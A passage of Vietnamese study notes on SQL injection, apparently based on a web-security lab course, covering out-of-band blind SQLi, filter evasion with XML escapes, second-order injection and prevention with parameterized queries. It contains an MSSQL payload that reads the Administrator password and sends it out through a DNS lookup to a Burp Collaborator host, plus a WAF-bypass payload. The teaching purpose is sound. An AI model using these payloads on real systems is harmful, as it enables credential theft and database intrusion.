Bạn có thể sử dụng Burp Collaborator để **tạo ra một subdomain duy nhất**, sau đó **poll** (truy vấn) máy chủ Collaborator để xác nhận thời điểm có bất kỳ truy vấn DNS nào xảy ra.

Sau khi đã xác nhận được cách kích hoạt **tương tác out-of-band**, bạn có thể sử dụng kênh out-of-band để **exfiltrate dữ liệu** từ ứng dụng có lỗ hổng. Ví dụ:

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Payload này sẽ:

1. Đọc mật khẩu của user **Administrator** từ bảng `users`.
2. Nối giá trị mật khẩu đó với một subdomain duy nhất của **Burp Collaborator**.
3. Kích hoạt một truy vấn DNS tới tên miền đó.

Ví dụ, nếu truy vấn DNS được ghi nhận là:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.ne
```

→ Lúc này bạn có thể thấy mật khẩu (`S3cure`) trực tiếp trong subdomain được gửi đi.

Kỹ thuật **out-of-band (OAST)** là một phương pháp mạnh mẽ để phát hiện và khai thác blind SQL injection, vì:

- Xác suất thành công cao.
- Có khả năng exfiltrate dữ liệu trực tiếp qua kênh out-of-band.

Vì lý do này, OAST thường **được ưu tiên** ngay cả khi các kỹ thuật blind SQL injection khác vẫn hoạt động.

> **Ghi chú:**
> 
> 
> Có nhiều cách để kích hoạt tương tác out-of-band, và mỗi loại cơ sở dữ liệu có thể áp dụng kỹ thuật khác nhau.
> 

---

# SQLi trong các trường hợp khác

---

Trong các lab trước, bạn đã sử dụng **query string** để chèn payload SQL độc hại. Tuy nhiên, bạn có thể thực hiện tấn công SQL injection bằng **bất kỳ dữ liệu đầu vào nào** mà bạn có thể kiểm soát và được ứng dụng xử lý thành một câu truy vấn SQL.

Ví dụ, một số trang web nhận dữ liệu đầu vào ở dạng **JSON** hoặc **XML** và sử dụng dữ liệu này để truy vấn cơ sở dữ liệu.

Các định dạng khác nhau này có thể mang lại những cách mới để **làm mờ (obfuscate)** các cuộc tấn công vốn bị chặn bởi WAF hoặc các cơ chế phòng thủ khác.

Các triển khai bảo mật yếu thường tìm kiếm các từ khóa SQL injection phổ biến trong request, vì vậy bạn có thể **vượt qua bộ lọc** bằng cách mã hóa hoặc escape các ký tự trong những từ khóa bị cấm.

Ví dụ, đoạn XML-based SQL injection dưới đây sử dụng **chuỗi escape XML** để mã hóa ký tự **S** trong từ **SELECT**:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Chuỗi này sẽ được **giải mã (decode)** ở phía server **trước khi** được gửi đến bộ thông dịch SQL.

---

# Second-order SQL injection

---

**SQL injection bậc nhất (First-order SQL injection)** xảy ra khi ứng dụng xử lý **dữ liệu đầu vào từ một HTTP request** và trực tiếp đưa dữ liệu đó vào một câu truy vấn SQL một cách không an toàn.

**SQL injection bậc hai (Second-order SQL injection)** xảy ra khi ứng dụng **lấy dữ liệu đầu vào từ HTTP request và lưu trữ nó để sử dụng sau này**. Việc lưu trữ này thường được thực hiện trong cơ sở dữ liệu, nhưng **không có lỗ hổng xảy ra ngay tại điểm lưu trữ**.

Sau đó, khi xử lý một HTTP request khác, ứng dụng **truy xuất dữ liệu đã lưu** và đưa nó vào câu truy vấn SQL một cách **không an toàn**. Vì lý do này, second-order SQL injection còn được gọi là **stored SQL injection** (SQL injection lưu trữ).

Second-order SQL injection thường xảy ra trong các tình huống mà **lập trình viên đã nhận thức về lỗ hổng SQL injection**, nên họ xử lý đầu vào ban đầu khi lưu trữ vào cơ sở dữ liệu một cách **an toàn**.

Khi dữ liệu này được xử lý sau đó, lập trình viên cho rằng dữ liệu **an toàn** vì nó đã được lưu trữ an toàn trước đó. **Tuy nhiên**, tại thời điểm sử dụng dữ liệu này, nó lại được xử lý **không an toàn**, vì lập trình viên **sai lầm cho rằng dữ liệu có thể tin cậy**.

---

# Phòng chống SQLi

---

Bạn có thể phòng hầu hết các trường hợp SQL injection bằng cách sử dụng **parameterized queries** thay vì **nối chuỗi trực tiếp** vào câu truy vấn. Các parameterized queries này còn được gọi là **prepared statements**.

Ví dụ, đoạn mã sau **dễ bị SQL injection** vì dữ liệu đầu vào từ người dùng được **nối trực tiếp vào câu truy vấn**:

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Bạn có thể viết lại đoạn mã này để **ngăn dữ liệu đầu vào ảnh hưởng đến cấu trúc truy vấn** như sau:

```java
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Trong ví dụ này, giá trị của `input` **không thể thay đổi cấu trúc câu truy vấn SQL**, nhờ vậy phòng chống SQL injection hiệu quả.

Bạn có thể sử dụng **parameterized queries** cho bất kỳ tình huống nào mà **dữ liệu không tin cậy** xuất hiện dưới dạng **giá trị trong câu truy vấn**, bao gồm:

- Trong **mệnh đề `WHERE`**.
- Trong các giá trị của câu lệnh `INSERT` hoặc `UPDATE`.

Tuy nhiên, parameterized queries **không thể dùng** để xử lý dữ liệu không tin cậy ở những phần khác của câu truy vấn, như:

- Tên bảng hoặc tên cột.
- Mệnh đề **`ORDER BY`**.

Các chức năng của ứng dụng mà chèn dữ liệu không tin cậy vào những phần này cần áp dụng **cách tiếp cận khác**, ví dụ:

- **Whitelisting**: chỉ cho phép các giá trị hợp lệ.
- Sử dụng **logic khác** để đạt được hành vi mong muốn mà không chèn dữ liệu không tin cậy trực tiếp.

Để một **parameterized query** thực sự hiệu quả trong việc ngăn SQL injection, **chuỗi câu truy vấn phải luôn là một hằng số được mã hóa cứng**. Nó **không bao giờ được chứa dữ liệu biến động** từ bất kỳ nguồn nào.

Đừng có nghĩ rằng bạn có thể **quyết định từng trường hợp** xem dữ liệu có đáng tin hay không, rồi tiếp tục **nối chuỗi trực tiếp trong các trường hợp được cho là an toàn**.

- Rất dễ phạm sai lầm về nguồn gốc dữ liệu.
- Hoặc các thay đổi trong các phần khác của code có thể làm dữ liệu “đáng tin” trở nên **không đáng tin nữa**.
